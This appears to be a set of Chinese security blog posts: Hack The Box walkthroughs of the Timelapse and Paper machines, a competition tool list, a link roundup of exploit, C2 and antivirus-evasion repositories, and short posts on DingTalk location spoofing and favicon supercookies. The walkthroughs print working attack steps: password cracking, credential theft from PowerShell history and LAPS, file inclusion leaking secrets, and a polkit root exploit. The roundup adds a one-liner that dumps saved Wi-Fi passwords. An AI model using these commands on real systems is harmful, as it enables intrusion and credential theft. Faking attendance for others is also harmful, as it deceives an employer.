[{"content":"这是一个windows内网环境的一个靶机\n开放了139和445端口，smb服务\n用hydra爆破会出错，网上看了一下htb的机器都这样，貌似得需要旧版本的hydra smb库。\n┌──(kali㉿kali)-[~] └─$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://10.10.11.152 Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purpose s (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-14 03:17:54 [INFO] Reduced number of tasks to 1 (smb does not like parallel connections) [DATA] max 1 task per 1 server, overall 1 task, 28688798 login tries (l:2/p:14344399), ~28688798 tries per task [DATA] attacking smb://10.10.11.152:445/ [ERROR] no reply from target smb://10.10.11.152:445/ 直接尝试guest用户匿名访问\n┌──(kali㉿kali)-[~] └─$ smbmap -u guest -p \u0026#34;\u0026#34; -H 10.10.11.152 [+] IP: 10.10.11.152:445 Name: 10.10.11.152 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC NETLOGON NO ACCESS Logon server share Shares READ ONLY SYSVOL NO ACCESS Logon server share 开放了IPC$和Shares，尝试访问\n┌──(kali㉿kali)-[~] └─$ smbclient \\\\\\\\10.10.11.152\\\\IPC$ -U guest\t#IPC$权限不够 1 ⨯ Enter WORKGROUP\\guest\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir NT_STATUS_INVALID_INFO_CLASS listing \\* ┌──(kali㉿kali)-[~] └─$ smbclient \\\\\\\\10.10.11.152\\\\Shares -U guest 130 ⨯ Enter WORKGROUP\\guest\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Mon Oct 25 11:39:15 2021 .. D 0 Mon Oct 25 11:39:15 2021 Dev D 0 Mon Oct 25 15:40:06 2021 HelpDesk D 0 Mon Oct 25 11:48:42 2021 6367231 blocks of size 4096. 1222161 blocks available smb: \\\u0026gt; cd Dev smb: \\Dev\\\u0026gt; dir . D 0 Mon Oct 25 15:40:06 2021 .. D 0 Mon Oct 25 15:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 11:46:42 2021 6367231 blocks of size 4096. 1342549 blocks available smb: \\Dev\\\u0026gt; get winrm_backup.zip getting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec) smb: \\Dev\\\u0026gt; cd .. smb: \\\u0026gt; cd HelpDesk smb: \\HelpDesk\\\u0026gt; dir . D 0 Mon Oct 25 11:48:42 2021 .. D 0 Mon Oct 25 11:48:42 2021 LAPS.x64.msi A 1118208 Mon Oct 25 10:57:50 2021 LAPS_Datasheet.docx A 104422 Mon Oct 25 10:57:46 2021 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 10:57:40 2021 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 10:57:44 2021 6367231 blocks of size 4096. 1341023 blocks available smb: \\HelpDesk\\\u0026gt; exit 找到了一个压缩包winrm_backup.zip，解压发现有密码。\n┌──(kali㉿kali)-[~] └─$ unzip winrm_backup.zip Archive: winrm_backup.zip [winrm_backup.zip] legacyy_dev_auth.pfx password: skipping: legacyy_dev_auth.pfx incorrect password ┌──(kali㉿kali)-[~] └─$ zip2john winrm_backup.zip \u0026gt; zip_hash 82 ⨯ Created directory: /home/kali/.john ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa t ype=8 ┌──(kali㉿kali)-[~] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 8 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status supremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx) 1g 0:00:00:00 DONE (2022-06-14 03:30) 4.761g/s 16540Kp/s 16540Kc/s 16540KC/s suzyqzb..superkebab Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. 将zip 转化为hash，然后用john爆破,拿到密码supremelegacy。尝试解压，得到了一个legacyy_dev_auth.pfx文件。\n发现还是有密码。\n继续爆破\n┌──(kali㉿kali)-[~] └─$ pfx2john legacyy_dev_auth.pfx \u0026gt; pfx_hash ┌──(kali㉿kali)-[~] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Will run 8 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status thuglegacy (legacyy_dev_auth.pfx) 1g 0:00:00:21 DONE (2022-06-14 03:37) 0.04668g/s 150875p/s 150875c/s 150875C/s thumper1990..thsco04 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. 拿到密码thuglegacy，打开看看里面有啥。\n一个私钥和证书但是不知道为啥只能导出证书。那就直接用openssl来导出。\n┌──(kali㉿kali)-[~] └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -out cert.pem Enter Import Password: Enter PEM pass phrase: Verifying - Enter PEM pass phrase: ┌──(kali㉿kali)-[~] └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem Enter Import Password: 私钥提取出来的指纹一样，可以确定提取成功了。\n查看证书\n用于某种客户端验证，再结合压缩包名称winrm_backup.zip可以确定是winrm的证书和私钥了，同时主机也开放了5986端口。\n直接用evil-winrm打。这里用kali自带的evil-winrm碰见了一个坑，用官网的安装方法覆盖安装一下就行了。\nhttps://github.com/Hackplayers/evil-winrm\ngem install evil-winrm ┌──(kali㉿kali)-[~] └─$ evil-winrm -i 10.10.11.152 -S -k key.pem -c cert.pem -p -u Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u0026#39; for Reline:Module Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; whoami timelapse\\legacyy 看样子是个低权，准备提权。\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; upload /home/kali/winPEASx64.exe Info: Uploading /home/kali/winPEASx64.exe to C:\\Users\\legacyy\\Documents\\winPEASx64.exe Data: 2581844 bytes of 2581844 bytes copied Info: Upload successful! *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; dir Directory: C:\\Users\\legacyy\\Documents Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 6/14/2022 9:09 AM 1916212 winPEASx64.exe *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; ./winPEASx64.exe Program \u0026#39;winPEASx64.exe\u0026#39; failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted soft wareAt line:1 char:1 + ./winPEASx64.exe + ~~~~~~~~~~~~~~~~. At line:1 char:1 + ./winPEASx64.exe + ~~~~~~~~~~~~~~~~ + CategoryInfo : ResourceUnavailable: (:) [], ApplicationFailedException + FullyQualifiedErrorId : NativeCommandFailed 擦，被杀了。懒的做免杀了，直接睡觉，然后做梦，然后我梦见了这个，powershell的历史命令。\n%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt 😋，打开看看里面有啥。\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; type C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history. txt whoami ipconfig /all netstat -ano |select-string LIST $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck $p = ConvertTo-SecureString \u0026#39;E3R$Q62^12p7PLlC%KWaxuaV\u0026#39; -AsPlainText -Force $c = New-Object System.Management.Automation.PSCredential (\u0026#39;svc_deploy\u0026#39;, $p) invoke-command -computername localhost -credential $c -port 5986 -usessl - SessionOption $so -scriptblock {whoami} get-aduser -filter * -properties * exit *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; 好家伙，我tm直接好家伙，用户名密码直接给我了。\nsvc_deploy:E3R$Q62^12p7PLlC%KWaxuaV\n用evil-winrm登录\n┌──(kali㉿kali)-[~] └─$ evil-winrm -i 10.10.11.152 -S -u svc_deploy -p \u0026#39;E3R$Q62^12p7PLlC%KWaxuaV\u0026#39; Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u0026#39; for Reline:Module Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents\u0026gt; whoami /all USER INFORMATION ---------------- User Name SID ==================== ============================================ timelapse\\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103 GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group TIMELAPSE\\LAPS_Readers Group S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled. 可以看见timelapse\\svc_deploy属于TIMELAPSE\\LAPS_Readers组。🤤不了解laps，貌似就是个管理密码的东西。\nhttps://adsecurity.org/?p=3164\ngoogle了一下这个组\nhttps://itconnect.uw.edu/wares/msinf/ous/laps/\n默认情况下，每个委派 OU 都有一个 LAPS 读者组，该组有权读取委派 OU 中所有计算机对象的密码。例如，Pottery OU 具有 u_msinf_delou_pottery_lapsreaders。每个 IT 支持组织都可以管理该组的成员资格，以授予或拒绝检索密码的能力。只有您的 OU 联系人组的成员才能管理您的 OU 的 LAPS 读者组。例如 Pottery OU Contacts 是 u_msinf_delou_pottery_oucontacts。要管理该组的成员，请导航到组服务，搜索您的 Laps Readers 组并根据需要添加/删除成员。 能读全部用户的密码，好耶😆。\n我也不会powershell，反正这样就读到密码了。。。\n*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents\u0026gt; get-adcomputer -filter {ms-mcs-admpwdexpirationtime -like \u0026#39;*\u0026#39;} -prop \u0026#39;ms-mcs-admpwd\u0026#39; , \u0026#39;ms-mcs- admpwdexpirationtime\u0026#39; DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb DNSHostName : dc01.timelapse.htb Enabled : True ms-mcs-admpwd : #R[2u3+6c5-NSg\u0026amp;FBbmWixNP ms-mcs-admpwdexpirationtime : 133001240354127216 Name : DC01 ObjectClass : computer ObjectGUID : 6e10b102-6936-41aa-bb98-bed624c9b98f SamAccountName : DC01$ SID : S-1-5-21-671920749-559770252-3318990721-1000 UserPrincipalName : 读取到密码#R[2u3+6c5-NSg\u0026amp;FBbmWixNP\nEvil-winrm验证一下\n┌──(kali㉿kali)-[~] └─$ evil-winrm -i 10.10.11.152 -S -u Administrator -p \u0026#39;#R[2u3+6c5-NSg\u0026amp;FBbmWixNP\u0026#39; 6 ⚙ Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u0026#39; for Reline:Module Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; whoami timelapse\\administrator Ok\u0026hellip;\n","permalink":"https://killdayu.com/posts/htb_timelapse/","summary":"这是一个windows内网环境的一个靶机\n开放了139和445端口，smb服务\n用hydra爆破会出错，网上看了一下htb的机器都这样，貌似得需要旧版本的hydra smb库。\n┌──(kali㉿kali)-[~] └─$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://10.10.11.152 Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purpose s (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-14 03:17:54 [INFO] Reduced number of tasks to 1 (smb does not like parallel connections) [DATA] max 1 task per 1 server, overall 1 task, 28688798 login tries (l:2/p:14344399), ~28688798 tries per task [DATA] attacking smb://10.","title":"HTB_Timelapse"},{"content":"国赛公布的工具\n序号 软件 版本 确定 1 Windows 10 professional ok 2 Microsoft Office Version 2010 以上 ok 4 VMwareWorkstation Version 12 以上 ok 5 Windows Server 2016 Datacenter ok 6 Wireshark 3.4.9 ok 7 bind 9.11.4 dns服务器 8 Kali Version2021.3 ok 9 IDA free 7 ok 10 OllyDbg Version1.10 以上 ok 11 PDFreader ok 12 Volatility Version2.6 以上 ok 13 Autopsy Version4.0 以上 一个取证工具，kali自带 14 windbg Version4.0 以上 ok 15 Jadx-gui 1.2.0 ok 16 apktool 2.6.1 ok 17 Android Studio 2021.3.1 待搭建 18 HxD Hex Editor Version 2.X 以上版本 ok 19 Android Emulator API27 安卓8 20 StegSolve 1.4 ok 21 audacity 3.1.0 音频分析工具 22 Parrot-security 4.11.2 ok 23 gdb-pwndbg 2021.06.22 。。。 24 sagemath 9.2 加解密用 25 pwntools 4.5.0 。。。 26 pycryptodome 3.14.1 加解密用，RSA 27 frida-server 15.1.10 ok，hook 28 frida-tools 10.4.1 ok 29 vscode X64-1.6.1 ok 30 Frp 0.38.0 ok 31 Neo-reGeorg v3.7.0 http协议的反代，webshell 32 EmEditor Free V21.5.2 文本编辑器 33 Putty 0.68 以上 ok 34 VNC viewer 1.2.1.2 ok 35 VirtualBox 6.1.28 ok 36 CaptfEncoder 2.1.0 ok 37 BeautifulSoup4 4.9.3 ok 38 one_gadget 1.7.4 pwn用 38 超级终端 设备调试连接工具 ok ","permalink":"https://killdayu.com/posts/%E5%85%A8%E5%9B%BD%E8%81%8C%E4%B8%9A%E9%99%A2%E6%A0%A1%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B_-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E4%B8%8E%E8%AF%84%E4%BC%B0%E8%B5%9B%E9%A1%B9_%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/","summary":"国赛公布的工具\n序号 软件 版本 确定 1 Windows 10 professional ok 2 Microsoft Office Version 2010 以上 ok 4 VMwareWorkstation Version 12 以上 ok 5 Windows Server 2016 Datacenter ok 6 Wireshark 3.4.9 ok 7 bind 9.11.4 dns服务器 8 Kali Version2021.3 ok 9 IDA free 7 ok 10 OllyDbg Version1.10 以上 ok 11 PDFreader ok 12 Volatility Version2.6 以上 ok 13 Autopsy Version4.0 以上 一个取证工具，kali自带 14 windbg Version4.0 以上 ok 15 Jadx-gui 1.","title":"全国职业院校技能大赛_信息安全管理与评估赛项_持续更新"},{"content":"第一次玩htb，感觉还不错。\nhttps://www.hackthebox.com/\n1.准备工作 配一下openvpn mac，windows\n可以直接用客户端打开\nlinux\nsudo openvpn lab_lker.ovpn 2.user.txt 网上教程很多，就不细说了。\n┌──(kali㉿kali)-[~/kali] └─$ nmap -sV 10.10.11.143 1 ⚙ Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-13 01:23 EDT Nmap scan report for office.paper (10.10.11.143) Host is up (0.23s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) 443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.73 seconds ┌──(kali㉿kali)-[~/kali] └─$ curl -I http://10.10.11.143/ 1 ⚙ HTTP/1.1 403 Forbidden Date: Mon, 13 Jun 2022 05:27:41 GMT Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 X-Backend-Server: office.paper Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT ETag: \u0026#34;30c0b-5c5c7fdeec240\u0026#34; Accept-Ranges: bytes Content-Length: 199691 Content-Type: text/html; charset=UTF-8 发现存在office.paper，配置hosts访问发现是一个wordpress\ntips\twordpress草稿未授权\nhttps://www.exploit-db.com/exploits/47690\nhttp://office.paper/?static=1\n发现新子域\nhttp://chat.office.paper/register/8qozr226AhkCHZdyY\n注册然后会被拉入一个群里面，翻聊天记录发现一个机器人的使用方法，可以查看文件，存在LFI。\n私聊它\nrecyclops file test.txt --- cat: /home/dwight/sales/test.txt: No such file or directory --- recyclops file ../../../proc/self/environ\t#查看程序运行时的环境变量 --- \u0026lt;!=====Contents of file ../../../proc/self/environ=====\u0026gt; RESPOND_TO_EDITED=trueROCKETCHAT_USER=recyclopsLANG=en_US.UTF-8OLDPWD=/home/dwight/hubotROCKETCHAT_URL=http://127.0.0.1:48320ROCKETCHAT_USESSL=falseXDG_SESSION_ID=1USER=dwightRESPOND_TO_DM=truePWD=/home/dwight/hubotHOME=/home/dwightPORT=8000ROCKETCHAT_PASSWORD=Queenofblad3s!23SHELL=/bin/shSHLVL=4BIND_ADDRESS=127.0.0.1LOGNAME=dwightDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/busXDG_RUNTIME_DIR=/run/user/1004PATH=/home/dwight/hubot/node_modules/coffeescript/bin:node_modules/.bin:node_modules/hubot/node_modules/.bin:/usr/bin:/bin_=/usr/bin/cat \u0026lt;!=====End of file ../../../proc/self/environ=====\u0026gt; 拿到user和passwd\ndwight:Queenofblad3s!23\n查看passwd文件发现存在dwight用户，22端口也开放，ssh直接连。\n家目录下存在user.txt\n3.root.txt 提权\nCVE-2021-3560\nhttps://github.com/RicterZ/CVE-2021-3560-Authentication-Agent\nmac交叉编译，sftp上传直接提。\nCGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build [dwight@paper ~]$ ./CVE-2021-3560 pwnkit.service === polkit CVE-2021-3560 exploit - RicterZ @ 360 Noah Lab === pid-623821 - [*] Registering PolicyKit authentication agent ... pid-623821 - [*] Authentication agent main loop running ... pid-623825 - [*] Registering PolicyKit authentication agent ... pid-623829 - [*] Registering PolicyKit authentication agent ... pid-623825 - [*] Authentication agent main loop running ... pid-623829 - [*] Authentication agent main loop running ... pid-623821 - [*] Starting systemd service \u0026#39;pwnkit.service\u0026#39; ... pid-623825 - [*] Enabling systemd unit file \u0026#39;/home/dwight/pwnkit.service\u0026#39; ... pid-623829 - [*] Reloading systemd daemon ... pid-623821 - [+] Received authentication request for action: \u0026#39;org.freedesktop.systemd1.manage-units\u0026#39; pid-623821 - [*] Cookie: 7-223b7416729388670f2d6b10c1245fa2-1-29e7c9e01426331bc08d1cfb4799e22c pid-623825 - [+] Received authentication request for action: \u0026#39;org.freedesktop.systemd1.manage-unit-files\u0026#39; pid-623825 - [*] Cookie: 8-620bd6d39fc68a11ba8e18f299d33621-1-1d92cbcd674e600750d75bc58c61eace pid-623829 - [+] Received authentication request for action: \u0026#39;org.freedesktop.systemd1.reload-daemon\u0026#39; pid-623829 - [*] Cookie: 9-de0cc06fa1f804c42f063371eadc237a-1-66d101ec1e5de8a6f2402906cd2ba04f pid-623817 - [+] File exists, popping root shell ... pwned-4.4# id uid=1004(dwight) gid=1004(dwight) euid=0(root) egid=0(root) groups=0(root),1004(dwight) pwned-4.4# cat /root/root.txt d8d5bbdcaf45684c13c995a3bc514ea0 4.tips 1.注意服务器返回的X-Backend-Server host碰撞来发现隐藏资产。\nhttps://github.com/pmiaowu/HostCollision/\nhttps://mp.weixin.qq.com/s/uH40OJ4ev0rpuzDLMn7x-A\nC:\\dayu\\tools\\HostCollision\u0026gt;java -jar HostCollision.jar =======================基 本 信 息======================= 版本: 2.2.6 下载地址: https://github.com/pmiaowu/HostCollision 请尽情享用本程序吧 ヾ(≧▽≦*)o =======================建 立 线 程 池======================= 线程 1 开始运行 =======================开 始 碰 撞======================= 当前进度 1/6: [████████] 16.67% 协议:http://, ip:10.10.11.143, host:test.paper 匹配失败-2 当前进度 2/6: [████████████████] 33.33% 协议:http://, ip:10.10.11.143, host:office.paper, title:Blunder Tiffin Inc. \u0026amp;#8211; The best paper company in the electric-city Scranton!, 匹配成功的数据包大小:23701, 状态码:200 匹配成功 当前进度 3/6: [█████████████████████████] 50% 协议:http://, ip:10.10.11.143, host:chat.office.paper, title:chat.paper.htb, 匹配成功的数据包大小:223163, 状态码:200 匹配成功 当前进度 4/6: [█████████████████████████████████] 66.67% 协议:https://, ip:10.10.11.143, host:test.paper 匹配失败-2 当前进度 5/6: [█████████████████████████████████████████] 83.33% 协议:https://, ip:10.10.11.143, host:office.paper 匹配失败-2 当前进度 6/6: [██████████████████████████████████████████████████] 100% 协议:https://, ip:10.10.11.143, host:chat.office.paper 匹配失败-2 ====================碰 撞 成 功 列 表==================== 协议:http://, ip:10.10.11.143, host:office.paper, title:Blunder Tiffin Inc. \u0026amp;#8211; The best paper company in the electric-city Scranton!, 匹配成功的数据包大小:23701, 状态码:200 匹配成功 协议:http://, ip:10.10.11.143, host:chat.office.paper, title:chat.paper.htb, 匹配成功的数据包大小:223163, 状态码:200 匹配成功 执行完毕 ヾ(≧▽≦*)o 程序安全退出 :) 2./proc/self/environ https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/s1-proc-directories\n","permalink":"https://killdayu.com/posts/htb_paper/","summary":"第一次玩htb，感觉还不错。\nhttps://www.hackthebox.com/\n1.准备工作 配一下openvpn mac，windows\n可以直接用客户端打开\nlinux\nsudo openvpn lab_lker.ovpn 2.user.txt 网上教程很多，就不细说了。\n┌──(kali㉿kali)-[~/kali] └─$ nmap -sV 10.10.11.143 1 ⚙ Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-13 01:23 EDT Nmap scan report for office.paper (10.10.11.143) Host is up (0.23s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) 443/tcp open ssl/http Apache httpd 2.","title":"HTB_Paper"},{"content":"梦 昨晚10点睡到早上十点，做了一个超长的梦，被tm一个贩毒集团的一直追杀，梦里差点被吓死。\nGithub 起床惯例，刷GitHub\n提权，Linux\nhttps://github.com/tr3ee/CVE-2022-23222 此漏洞影响Linux Kernel 5.8 - 5.16，并在5.10.92 / 5.15.15 / 5.16.1中修复。 https://github.com/RicterZ/CVE-2021-3560-Authentication-Agent polkit 0.113引入 取证，微信解密\nhttps://github.com/x1hy9/WeChatUserDB https://www.52pojie.cn/thread-1084703-1-1.html https://github.com/Mr0x01/WXDBDecrypt.NET IPFS\nhttps://ipfs.io/ 去中心化文件系统，可匿名发布信息和文件 漏洞库\nhttps://github.com/Threekiii/Vulnerability-Wiki Windows c2\nhttps://github.com/MythicAgents/Apollo Microsoft Office Word 远程执行代码\nhttps://github.com/lockedbyte/CVE-2021-40444 python实现的反向shell\nhttps://github.com/t0thkr1s/revshellgen 感觉没啥用，推荐 https://github.com/WangYihang/Platypus 交互式shell /usr/bin/script -qc /bin/bash go web框架\nhttps://github.com/flamego/flamego 域名预测\nhttps://github.com/LandGrey/domainNamePredictor 红队知识仓库 *\nhttps://github.com/Threekiii/Awesome-Redteam https://github.com/pen4uin/awesome-pentest-note http://wiki.tidesec.com/ https://github.com/guchangan1/All-Defense-Tool 免杀\nhttps://github.com/Threekiii/Awesome-Redteam/blob/master/tips/内网渗透-免杀.md https://github.com/TideSec/BypassAntiVirus tips\nhttps://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/攻防渗透常用命令速查.md exp\nhttps://github.com/Threekiii/Awesome-Exploit c2服务器流量隐匿\nhttps://github.com/wikiZ/RedGuard tip\npowershell history %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt wifi password for /f \u0026#34;skip=9 tokens=1,2 delims=:\u0026#34; %i in (\u0026#39;netsh wlan show profiles\u0026#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear Ctf tools\nhttps://github.com/UniiemStudio/CTFever exp\nhttps://github.com/zangcc/Aazhen-v3.1 https://github.com/Weik1/Artillery https://github.com/awake1t/Awesome-hacking-tools 暂时就这样吧\n","permalink":"https://killdayu.com/posts/2022.6.10/","summary":"梦 昨晚10点睡到早上十点，做了一个超长的梦，被tm一个贩毒集团的一直追杀，梦里差点被吓死。\nGithub 起床惯例，刷GitHub\n提权，Linux\nhttps://github.com/tr3ee/CVE-2022-23222 此漏洞影响Linux Kernel 5.8 - 5.16，并在5.10.92 / 5.15.15 / 5.16.1中修复。 https://github.com/RicterZ/CVE-2021-3560-Authentication-Agent polkit 0.113引入 取证，微信解密\nhttps://github.com/x1hy9/WeChatUserDB https://www.52pojie.cn/thread-1084703-1-1.html https://github.com/Mr0x01/WXDBDecrypt.NET IPFS\nhttps://ipfs.io/ 去中心化文件系统，可匿名发布信息和文件 漏洞库\nhttps://github.com/Threekiii/Vulnerability-Wiki Windows c2\nhttps://github.com/MythicAgents/Apollo Microsoft Office Word 远程执行代码\nhttps://github.com/lockedbyte/CVE-2021-40444 python实现的反向shell\nhttps://github.com/t0thkr1s/revshellgen 感觉没啥用，推荐 https://github.com/WangYihang/Platypus 交互式shell /usr/bin/script -qc /bin/bash go web框架\nhttps://github.com/flamego/flamego 域名预测\nhttps://github.com/LandGrey/domainNamePredictor 红队知识仓库 *\nhttps://github.com/Threekiii/Awesome-Redteam https://github.com/pen4uin/awesome-pentest-note http://wiki.tidesec.com/ https://github.com/guchangan1/All-Defense-Tool 免杀\nhttps://github.com/Threekiii/Awesome-Redteam/blob/master/tips/内网渗透-免杀.md https://github.com/TideSec/BypassAntiVirus tips\nhttps://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/攻防渗透常用命令速查.md exp\nhttps://github.com/Threekiii/Awesome-Exploit c2服务器流量隐匿\nhttps://github.com/wikiZ/RedGuard tip\npowershell history %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt wifi password for /f \u0026#34;skip=9 tokens=1,2 delims=:\u0026#34; %i in (\u0026#39;netsh wlan show profiles\u0026#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear Ctf tools","title":"2022.6.10"},{"content":"钉钉+某助手配合某框架的通用化在没root的手机上实现远程打卡😋（之前都没想到弄），这样我就不用每天9点起床手动帮别人打卡了。还能配合gayhub上开源的auto. js某脚本实现自动打卡。\n","permalink":"https://killdayu.com/posts/dingtalk_location/","summary":"钉钉+某助手配合某框架的通用化在没root的手机上实现远程打卡😋（之前都没想到弄），这样我就不用每天9点起床手动帮别人打卡了。还能配合gayhub上开源的auto. js某脚本实现自动打卡。","title":"Dingtalk_Location"},{"content":"我草这个有点🐮，Google翻译看着有点头疼，原理大概就是浏览器会缓存网站的favicon.ico，然后缓存到的favicon.ico再次刷新网页的时候不会重新请求。服务器会在首次访问时创建多个路由（这样才能实现区分多个不同客户端），然后随机将一些路由的favicon.ico设置成200，同时按照路由的favicon.ico生成一个id。客户端再次刷新时由于缓存了某些路由之前的favicon.ico，就只会去请求之前404的favicon.ico，服务器就能得到404的favicon.ico请求然后还原出客户端的id。相当于实现了一个cookie，其实id的实习都源于浏览器的请求，所以代理这些网络层面的都隐藏不了。但是我试了下最新的Chrome失效了😋。但是貌似之前的Firefox中招了，Tor就是魔改的Firefox，也不知道有没有继承缓存favicon.ico这个特性😋，暗网不再暗网😋。一切特征都是supercookie😋。 https://github.com/jonasstrehle/supercookie 